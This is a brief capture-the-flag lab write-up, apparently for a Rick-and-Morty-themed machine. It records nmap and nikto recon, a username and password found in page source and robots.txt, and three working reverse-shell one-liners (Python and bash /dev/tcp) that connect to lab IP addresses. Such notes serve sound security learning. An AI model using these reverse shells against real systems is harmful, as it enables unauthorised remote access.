## Recon
- nmap result :
	- PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   3072 27:1c:86:3b:e6:ac:1f:6d:37:52:24:66:31:97:32:f5 (RSA)
			|   256 79:05:fb:50:41:c3:cb:b8:df:da:ee:c7:af:07:d2:fd (ECDSA)
			|_  256 80:bc:40:b3:15:9f:e6:8b:c6:6f:06:5a:6d:62:0e:4e (ED25519)
		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
			|_http-title: Rick is sup4r cool
			|_http-server-header: Apache/2.4.41 (Ubuntu)
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
- Forgotten html note :
	- Username: R1ckRul3s
- found this nonsense in robot.txt
	- Wubbalubbadubdub <- Password
- Using nikto found login page 
	- /login.php
## Gain Access
- After logging in i tried to reverse shell with python and python3 and bash but most of them didn't work , 
	- python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.192.3',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
	- bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
- The one that worked is weirdly 
	- bash -c 'bash -i >& /dev/tcp/192.168.192.5/4444 0>&1'